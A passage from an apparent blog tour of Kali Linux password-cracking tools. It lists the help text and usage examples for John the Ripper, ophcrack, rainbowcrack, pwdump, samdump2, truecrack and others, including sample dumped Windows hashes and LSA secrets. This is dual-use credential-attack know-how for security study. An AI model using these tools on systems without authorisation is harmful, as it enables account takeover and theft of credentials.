<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>John the Ripper password cracker, ver: 1.7.9-jumbo-7_omp [linux-x86-64]
</span><span class='line'>Copyright (c) 1996-2012 by Solar Designer and others
</span><span class='line'>Homepage: http://www.openwall.com/john/
</span><span class='line'>
</span><span class='line'>Usage: john [OPTIONS] [PASSWORD-FILES]
</span><span class='line'>--config=FILE             use FILE instead of john.conf or john.ini
</span><span class='line'>--single[=SECTION]        "single crack" mode
</span><span class='line'>--wordlist[=FILE] --stdin wordlist mode, read words from FILE or stdin
</span><span class='line'>                  --pipe  like --stdin, but bulk reads, and allows rules
</span><span class='line'>--loopback[=FILE]         like --wordlist, but fetch words from a .pot file
</span><span class='line'>--dupe-suppression        suppress all dupes in wordlist (and force preload)
</span><span class='line'>--encoding=NAME           input data is non-ascii (eg. UTF-8, ISO-8859-1).
</span><span class='line'>                          For a full list of NAME use --list=encodings
</span><span class='line'>--rules[=SECTION]         enable word mangling rules for wordlist modes
</span><span class='line'>--incremental[=MODE]      "incremental" mode [using section MODE]
</span><span class='line'>--markov[=OPTIONS]        "Markov" mode (see doc/MARKOV)
</span><span class='line'>--external=MODE           external mode or word filter
</span><span class='line'>--stdout[=LENGTH]         just output candidate passwords [cut at LENGTH]
</span><span class='line'>--restore[=NAME]          restore an interrupted session [called NAME]
</span><span class='line'>--session=NAME            give a new session the NAME
</span><span class='line'>--status[=NAME]           print status of a session [called NAME]
</span><span class='line'>--make-charset=FILE       make a charset file. It will be overwritten
</span><span class='line'>--show[=LEFT]             show cracked passwords [if =LEFT, then uncracked]
</span><span class='line'>--test[=TIME]             run tests and benchmarks for TIME seconds each
</span><span class='line'>--users=[-]LOGIN|UID[,..] [do not] load this (these) user(s) only
</span><span class='line'>--groups=[-]GID[,..]      load users [not] of this (these) group(s) only
</span><span class='line'>--shells=[-]SHELL[,..]    load users with[out] this (these) shell(s) only
</span><span class='line'>--salts=[-]COUNT[:MAX]    load salts with[out] COUNT [to MAX] hashes
</span><span class='line'>--pot=NAME                pot file to use
</span><span class='line'>--format=NAME             force hash type NAME: afs bf bfegg bsdi crc32 crypt
</span><span class='line'>                          des django dmd5 dominosec dragonfly3-32 dragonfly3-64
</span><span class='line'>                          dragonfly4-32 dragonfly4-64 drupal7 dummy dynamic_n
</span><span class='line'>                          epi episerver gost hdaa hmac-md5 hmac-sha1
</span><span class='line'>                          hmac-sha224 hmac-sha256 hmac-sha384 hmac-sha512
</span><span class='line'>                          hmailserver ipb2 keepass keychain krb4 krb5 lm lotus5
</span><span class='line'>                          md4-gen md5 md5ns mediawiki mscash mscash2 mschapv2
</span><span class='line'>                          mskrb5 mssql mssql05 mysql mysql-sha1 nethalflm netlm
</span><span class='line'>                          netlmv2 netntlm netntlmv2 nsldap nt nt2 odf office
</span><span class='line'>                          oracle oracle11 osc pdf phpass phps pix-md5 pkzip po
</span><span class='line'>                          pwsafe racf rar raw-md4 raw-md5 raw-md5u raw-sha
</span><span class='line'>                          raw-sha1 raw-sha1-linkedin raw-sha1-ng raw-sha224
</span><span class='line'>                          raw-sha256 raw-sha384 raw-sha512 salted-sha1 sapb
</span><span class='line'>                          sapg sha1-gen sha256crypt sha512crypt sip ssh
</span><span class='line'>                          sybasease trip vnc wbb3 wpapsk xsha xsha512 zip
</span><span class='line'>--list=WHAT               list capabilities, see --list=help or doc/OPTIONS
</span><span class='line'>--save-memory=LEVEL       enable memory saving, at LEVEL 1..3
</span><span class='line'>--mem-file-size=SIZE      size threshold for wordlist preload (default 5 MB)
</span><span class='line'>--nolog                   disables creation and writing to john.log file
</span><span class='line'>--crack-status            emit a status line whenever a password is cracked
</span><span class='line'>--max-run-time=N          gracefully exit after this many seconds
</span><span class='line'>--regen-lost-salts=N      regenerate lost salts (see doc/OPTIONS)
</span><span class='line'>--plugin=NAME[,..]        load this (these) dynamic plugin(s)</span></code></pre></td></tr></table></div></figure>


<p><strong>johnny</strong></p>

<p>GUI for the John the Ripper password cracking tool.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/password/johnny.png" title="johnny" alt="johnny"></p>

<p><strong>lsadump</strong></p>

<p>Dump LSA secrets</p>

<p><a href="http://tools.kali.org/password-attacks/creddump">Usage example from Kali site</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# lsadump system security
</span><span class='line'>_SC_ALG
</span><span class='line'>
</span><span class='line'>_SC_Dnscache
</span><span class='line'>
</span><span class='line'>_SC_upnphost
</span><span class='line'>
</span><span class='line'>20ed87e2-3b82-4114-81f9-5e219ed4c481-SALEMHELPACCOUNT
</span><span class='line'>
</span><span class='line'>_SC_WebClient
</span><span class='line'>
</span><span class='line'>_SC_RpcLocator
</span><span class='line'>
</span><span class='line'>0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantSID
</span><span class='line'>0000   01 05 00 00 00 00 00 05 15 00 00 00 B6 44 E4 23    .............D.#
</span><span class='line'>0010   F4 50 BA 74 07 E5 3B 2B E8 03 00 00                .P.t..;+....
</span><span class='line'>
</span><span class='line'>0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantAccount
</span><span class='line'>0000   00 38 00 48 00 6F 00 31 00 49 45 00 4A 00 26 00    E.J.&.8.H.o.1.I.
</span><span class='line'>0010   00 63 00 72 00 48 00 68 00 53 6B 00 00 00          h.S.c.r.H.k...
</span><span class='line'>
</span><span class='line'>_SC_MSDTC
</span><span class='line'>
</span><span class='line'>_SC_SSDPSRV
</span><span class='line'>
</span><span class='line'>_SC_Alerter
</span><span class='line'>
</span><span class='line'>_SC_RpcSs
</span><span class='line'>
</span><span class='line'>_SC_LmHosts
</span><span class='line'>
</span><span class='line'>_SC_BthServ</span></code></pre></td></tr></table></div></figure>


<p><strong>maskgen</strong></p>

<p>Generate hashcat masks</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/password/maskgen.png" title="maskgen" alt="maskgen"></p>

<p><strong>multiforcer</strong></p>

<p>A CUDA &amp; OpenCL accelerated rainbow table implementation from the ground up, and a CUDA hash brute forcing tool with support for many hash types including MD5, SHA1, LM, NTLM, and lots more.</p>

<p><a href="http://www.cryptohaze.com/multiforcer.php">Basic command line parameters</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-h / --hashtype [hash type] (required) This specifies the hash type to search. See the wiki for a current list of supported hashes.
</span><span class='line'>-c / --charsetfile &lt;filename&gt; This specifies the charset file for single charset use.
</span><span class='line'>-u / --charsetfilemulti &lt;filename&gt; This specifies the charset file for per-position charset use.
</span><span class='line'>-o / --outputfile (optional) This specifies the output for found hashes. The file will be appended, not overwritten.
</span><span class='line'>-f / --hashfile (required) This specifies the file of hashes. Hashes should be in ASCII-hex format (as they are typically found), one per line. The file should end with a newline.
</span><span class='line'>--min / --max (required) These set the minimum and maximum password lengths to search. Lengths of 0 through 14 are currently supported.
</span><span class='line'>-m / --ms (optional) This specifies the target kernel time, in milliseconds (1/1000th of a second). When using a system with a GUI, lower times will allow better display response, but will lower performance. See below for more details. The default is 50ms, which should not interfere with general system use.
</span><span class='line'>-l / --lookup (optional) Use a 512MB chunk of GPU RAM to improve performance on very large hashlists. Requires at least 768MB video RAM to use.</span></code></pre></td></tr></table></div></figure>


<p><strong>ophcrack</strong></p>

<p>A Microsoft Windows password cracker using rainbow tables</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/password/ophcrack.png" title="ophcrack" alt="ophcrack"></p>

<p><strong>ophcrack-cli</strong></p>

<p>Command line interface for ophcrack</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ophcrack 3.4.0 by Objectif Securite (http://www.objectif-securite.ch)
</span><span class='line'>
</span><span class='line'>Usage: ophcrack [OPTIONS]
</span><span class='line'>Cracks Windows passwords with Rainbow tables
</span><span class='line'>
</span><span class='line'>  -a              disable audit mode (default)
</span><span class='line'>  -A              enable audit mode
</span><span class='line'>  -b              disable bruteforce
</span><span class='line'>  -B              enable bruteforce (default)
</span><span class='line'>  -c config_file  specify the config file to use
</span><span class='line'>  -D              display (lots of!) debugging information
</span><span class='line'>  -d dir          specify tables base directory
</span><span class='line'>  -e              do not display empty passwords
</span><span class='line'>  -f file         load hashes from the specified file (pwdump or session)
</span><span class='line'>  -g              disable GUI
</span><span class='line'>  -h              display this information
</span><span class='line'>  -i              hide usernames
</span><span class='line'>  -I              show usernames (default)
</span><span class='line'>  -l file         log all output to the specified file
</span><span class='line'>  -n num          specify the number of threads to use
</span><span class='line'>  -o file         write cracking output to file in pwdump format
</span><span class='line'>  -p num          preload (0 none, 1 index, 2 index+end, 3 all default)
</span><span class='line'>  -q              quiet mode
</span><span class='line'>  -r              launch the cracking when ophcrack starts (GUI only)
</span><span class='line'>  -s              disable session auto-saving
</span><span class='line'>  -S session_file specify the file to use to automatically save the progress of the search
</span><span class='line'>  -u              display statistics when cracking ends
</span><span class='line'>  -t table1[,a[,b,...]][:table2[,a[,b,...]]]
</span><span class='line'>                  specify which table to use in the directory given by -d
</span><span class='line'>  -v              verbose
</span><span class='line'>  -w dir          load hashes from encrypted SAM file in directory dir
</span><span class='line'>  -x file         export data in CSV format to file
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Example:  ophcrack -g -d /path/to/tables -t xp_free_fast,0,3:vista_free -f in.txt
</span><span class='line'>
</span><span class='line'>      Launch ophcrack in command line using tables 0 and 3 in
</span><span class='line'>      /path/to/tables/xp_free_fast and all tables in /path/to/tables/vista_free
</span><span class='line'>      and cracks hashes from pwdump file in.txt</span></code></pre></td></tr></table></div></figure>


<p><strong>policygen</strong></p>

<p>Generate hashcat masks</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: policygen [options]
</span><span class='line'>
</span><span class='line'>Type --help for more options
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  --version             show program's version number and exit
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  --length=8            Password length
</span><span class='line'>  -o masks.txt, --output=masks.txt
</span><span class='line'>                        Save masks to a file
</span><span class='line'>  --pps=1000000000      Passwords per Second
</span><span class='line'>  -v, --verbose         
</span><span class='line'>
</span><span class='line'>  Password Policy:
</span><span class='line'>    Define the minimum (or maximum) password strength policy that you
</span><span class='line'>    would like to test
</span><span class='line'>
</span><span class='line'>    --mindigits=1       Minimum number of digits
</span><span class='line'>    --minlower=1        Minimum number of lower-case characters
</span><span class='line'>    --minupper=1        Minimum number of upper-case characters
</span><span class='line'>    --minspecial=1      Minimum number of special characters
</span><span class='line'>    --maxdigits=3       Maximum number of digits
</span><span class='line'>    --maxlower=3        Maximum number of lower-case characters
</span><span class='line'>    --maxupper=3        Maximum number of upper-case characters
</span><span class='line'>    --maxspecial=3      Maximum number of special characters</span></code></pre></td></tr></table></div></figure>


<p><strong>pwdump</strong></p>

<p>Dump password hashes</p>

<p><a href="http://tools.kali.org/password-attacks/creddump">Usage example from Kali site</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# pwdump system sam
</span><span class='line'>Administrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::
</span><span class='line'>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class='line'>HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::
</span><span class='line'>SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::</span></code></pre></td></tr></table></div></figure>


<p><strong>rainbowcrack</strong></p>

<p>Cracks hashes with rainbow tables.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>RainbowCrack 1.5
</span><span class='line'>Copyright 2003-2010 RainbowCrack Project. All rights reserved.
</span><span class='line'>Official Website: http://project-rainbowcrack.com/
</span><span class='line'>
</span><span class='line'>usage: rcrack rt_files [rt_files ...] -h hash
</span><span class='line'>       rcrack rt_files [rt_files ...] -l hash_list_file
</span><span class='line'>       rcrack rt_files [rt_files ...] -f pwdump_file
</span><span class='line'>       rcrack rt_files [rt_files ...] -n pwdump_file
</span><span class='line'>rt_files:               path to the rainbow table(s), wildchar(*, ?) supported
</span><span class='line'>-h hash:                load single hash
</span><span class='line'>-l hash_list_file:      load hashes from a file, each hash in a line
</span><span class='line'>-f pwdump_file:         load lanmanager hashes from pwdump file
</span><span class='line'>-n pwdump_file:         load ntlm hashes from pwdump file
</span><span class='line'>
</span><span class='line'>hash algorithms implemented in alglib0.so:
</span><span class='line'>    lm, plaintext_len limit: 0 - 7
</span><span class='line'>    ntlm, plaintext_len limit: 0 - 15
</span><span class='line'>    md5, plaintext_len limit: 0 - 15
</span><span class='line'>    sha1, plaintext_len limit: 0 - 20
</span><span class='line'>    mysqlsha1, plaintext_len limit: 0 - 20
</span><span class='line'>    halflmchall, plaintext_len limit: 0 - 7
</span><span class='line'>    ntlmchall, plaintext_len limit: 0 - 15
</span><span class='line'>    oracle-SYSTEM, plaintext_len limit: 0 - 10
</span><span class='line'>    md5-half, plaintext_len limit: 0 - 15
</span><span class='line'>
</span><span class='line'>example: rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592
</span><span class='line'>         rcrack *.rt -l hash.txt</span></code></pre></td></tr></table></div></figure>


<p><strong>rcracki_mt</strong></p>

<p>A modified version of rcrack which supports hybrid and indexed tables. In addition to that, it also adds multi-core support.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>RainbowCrack (improved, multi-threaded) - Making a Faster Cryptanalytic Time-Memory Trade-Off
</span><span class='line'>by Martin Westergaard &lt;martinwj2005@gmail.com&gt;
</span><span class='line'>multi-threaded and enhanced by neinbrucke
</span><span class='line'>*nix/64-bit compatibility and co-maintainer - James Nobis &lt;quel@quelrod.net&gt;
</span><span class='line'>http://www.freerainbowtables.com/
</span><span class='line'>All code/binaries are under GPL2 Copyright at a minimum
</span><span class='line'>original code by Zhu Shuanglei &lt;shuanglei@hotmail.com&gt;
</span><span class='line'>
</span><span class='line'>usage: rcracki_mt -h hash rainbow_table_pathname
</span><span class='line'>       rcracki_mt -l hash_list_file rainbow_table_pathname
</span><span class='line'>       rcracki_mt -f pwdump_file rainbow_table_pathname
</span><span class='line'>       rcracki_mt -c lst_file rainbow_table_pathname
</span><span class='line'>
</span><span class='line'>-h hash:                use raw hash as input
</span><span class='line'>-l hash_list_file:      use hash list file as input, each hash in a line
</span><span class='line'>-f pwdump_file:         use pwdump file as input, handles lanmanager hash only
</span><span class='line'>-c lst_file:            use .lst (cain format) file as input
</span><span class='line'>-r [-s session_name]:   resume from previous session, optional session name
</span><span class='line'>rainbow_table_pathname: pathname(s) of the rainbow table(s)
</span><span class='line'>
</span><span class='line'>Extra options:    -t [nr] use this amount of threads/cores, default is 1
</span><span class='line'>                  -o [output_file] write (temporary) results to this file
</span><span class='line'>                  -s [session_name] write session data with this name
</span><span class='line'>                  -k keep precalculation on disk
</span><span class='line'>                  -d run sha1 hashes against mysqlsha1 tables
</span><span class='line'>                  -m [megabytes] limit memory usage
</span><span class='line'>                  -v show debug information
</span><span class='line'>
</span><span class='line'>example: rcracki_mt -h 5d41402abc4b2a76b9719d911017c592 -t 2 [path]/MD5
</span><span class='line'>         rcracki_mt -l hash.txt [path_to_specific_table]/*
</span><span class='line'>         rcracki_mt -f hash.txt -t 4 -o results.txt *.rti</span></code></pre></td></tr></table></div></figure>


<p><strong>rsmangler</strong></p>

<p>RSMangler will take a wordlist and perform various manipulations on it similar to those done by John the Ripper, the main difference being that it will first take the input words and generate all permutations and the acronym of the words (in the order they appear in the file) before it applies the rest of the mangles.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsmangler v 1.4 Robin Wood (robin@digininja.org) &lt;www.randomstorm.com&gt;
</span><span class='line'>
</span><span class='line'>To pass the initial words in on standard in do:
</span><span class='line'>
</span><span class='line'>cat wordlist.txt | ./rsmangler.rb --file - &gt; new_wordlist.rb
</span><span class='line'>
</span><span class='line'>All options are ON by default, these parameters turn them OFF
</span><span class='line'>
</span><span class='line'>Usage: rsmangler.rb [OPTION]
</span><span class='line'>  --help, -h: show help
</span><span class='line'>  --file, -f: the input file, use - for STDIN
</span><span class='line'>  --max, -x: maximum word length
</span><span class='line'>  --min, -m: minimum word length
</span><span class='line'>  --perms, -p: permutate all the words
</span><span class='line'>  --double, -d: double each word
</span><span class='line'>  --reverse, -r: reverser the word
</span><span class='line'>  --leet, -t: l33t speak the word
</span><span class='line'>  --full-leet, -T: all posibilities l33t
</span><span class='line'>  --capital, -c: capitalise the word
</span><span class='line'>  --upper, -u: uppercase the word
</span><span class='line'>  --lower, -l: lowercase the word
</span><span class='line'>  --swap, -s: swap the case of the word
</span><span class='line'>  --ed, -e: add ed to the end of the word
</span><span class='line'>  --ing, -i: add ing to the end of the word
</span><span class='line'>  --punctuation: add common punctuation to the end of the word
</span><span class='line'>  --years, -y: add all years from 1990 to current year to start and end
</span><span class='line'>  --acronym, -a: create an acronym based on all the words entered in order and add to word list
</span><span class='line'>  --common, -C: add the following words to start and end: admin, sys, pw, pwd
</span><span class='line'>  --pna: add 01 - 09 to the end of the word
</span><span class='line'>  --pnb: add 01 - 09 to the beginning of the word
</span><span class='line'>  --na: add 1 - 123 to the end of the word
</span><span class='line'>  --nb: add 1 - 123 to the beginning of the word
</span><span class='line'>  --force - don't check ooutput size
</span><span class='line'>  --space - add spaces between words</span></code></pre></td></tr></table></div></figure>


<p><strong>samdump2</strong></p>

<p>Dumps Windows 2k/NT/XP/Vista password hashes</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>samdump2 1.1.1 by Objectif Securite
</span><span class='line'>http://www.objectif-securite.ch
</span><span class='line'>original author: ncuomo@studenti.unina.it
</span><span class='line'>
</span><span class='line'>Usage:
</span><span class='line'>samdump2 samhive keyfile</span></code></pre></td></tr></table></div></figure>


<p><strong>sipcrack</strong></p>

<p>SIPcrack is a SIP login sniffer/cracker that contains 2 programs:  sipdump  to  capture  the digest authentication and sipcrack to bruteforce
the hash using a wordlist or standard input.</p>

<p>sipcrack bruteforces the user&rsquo;s password with the dump  file  generated
by  sipdump. If a password is found, the sniffed and cracked login will
be updated in the dump file.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/password/sipcrack.png" title="sipcrack" alt="sipcrack"></p>

<p><strong>sucrack</strong></p>

<p>Multithreaded Linux/UNIX tool for brute-force cracking
of local user accounts via su.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sucrack [options] wordlist</span></code></pre></td></tr></table></div></figure>


<p><strong>truecrack</strong></p>

<p>TrueCrack is a brute-force password cracker for TrueCrypt volumes. It works on Linux and it is optimized for Nvidia Cuda technology. It supports:</p>

<p>PBKDF2 (defined in PKCS5 v2.0) based on key derivation functions: Ripemd160, Sha512 and Whirlpool.</p>

<p>XTS block cipher mode for hard disk encryption based on encryption algorithms: AES, SERPENT, TWOFISH.</p>

<p>File-hosted (container) and Partition/device-hosted.</p>

<p>Hidden volumes and Backup headers.</p>

<p>TrueCrack is able to perform a brute-force attack based on:</p>

<p>Dictionary: read the passwords from a file of words.</p>

<p>Alphabet: generate all passwords of given length from given alphabet.</p>

<p>TrueCrack works on gpu and cpu</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>TrueCrack v3.0
</span><span class='line'>Website: http://code.google.com/p/truecrack
</span><span class='line'>Contact us: infotruecrack@gmail.com
</span><span class='line'>Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
</span><span class='line'>Based on TrueCrypt, freely available at http://www.truecrypt.org/
</span><span class='line'>Copyright (c) 2011 by Luca Vaccaro.
</span><span class='line'>
</span><span class='line'>Usage:
</span><span class='line'> truecrack -t &lt;truecrypt_file&gt; -k &lt;ripemd160|sha512|whirlpool&gt; -w &lt;wordlist_file&gt; [-b &lt;parallel_block&gt;]
</span><span class='line'> truecrack -t &lt;truecrypt_file&gt; -k &lt;ripemd160|sha512|whirlpool&gt; -c &lt;charset&gt; [-s &lt;minlength&gt;] -m &lt;maxlength&gt; [-b &lt;parallel_block&gt;]
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'> -h --help                        Display this information.
</span><span class='line'> -t --truecrypt &lt;truecrypt_file&gt;    Truecrypt volume file.
</span><span class='line'> -k --key &lt;ripemd160 | sha512 | whirlpool&gt;      Key derivation function (default ripemd160).
</span><span class='line'> -b --blocksize &lt;parallel_blocks&gt;       Number of parallel computations (board dependent).
</span><span class='line'> -w --wordlist &lt;wordlist_file&gt;      File of words, for Dictionary attack.
</span><span class='line'> -c --charset &lt;alphabet&gt;        Alphabet generator, for Alphabet attack.
</span><span class='line'> -s --startlength &lt;minlength&gt;       Starting length of passwords, for Alphabet attack (default 1).
</span><span class='line'> -m --maxlength &lt;maxlength&gt;     Maximum length of passwords, for Alphabet attack.
</span><span class='line'> -r --restore &lt;number&gt;          Restore the computation.
</span><span class='line'> -v --verbose                     Show computation messages.
</span><span class='line'>
</span><span class='line'>Sample:
</span><span class='line'> Dictionary mode: truecrack --truecrypt ./volume --wordlist ./dictionary.txt 
</span><span class='line'> Charset mode: truecrack --truecrypt ./volume --charset ./dictionary.txt --maxlength 10</span></code></pre></td></tr></table></div></figure>


<h3>Online Attacks</h3>

<p><strong>cewl</strong></p>

